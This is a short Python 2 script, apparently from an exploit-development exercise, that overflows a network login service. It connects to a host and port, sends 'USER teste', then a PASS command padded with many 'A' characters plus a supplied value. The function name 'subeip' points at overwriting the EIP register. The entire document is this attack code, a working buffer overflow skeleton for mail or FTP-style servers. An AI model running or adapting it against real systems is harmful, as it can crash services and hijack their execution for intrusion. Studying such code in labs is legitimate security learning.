#!/usr/bin/python
#-*-coding: utf-8-*-
import socket
def subeip(ip,porta,buffer,sob):
    buffer1 = "A" * buffer + sob



    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,porta))
    res = s.recv(1024)
    print(res)

    s.send("USER teste\r\n")
    res = s.recv(1024)
    print(res)

    s.send("PASS"+buffer1+"\r\n")
    res = s.recv(1024)
    print(res)

    s.send("QUIT\r\n")
    res = s.recv(1024)
    print(res)

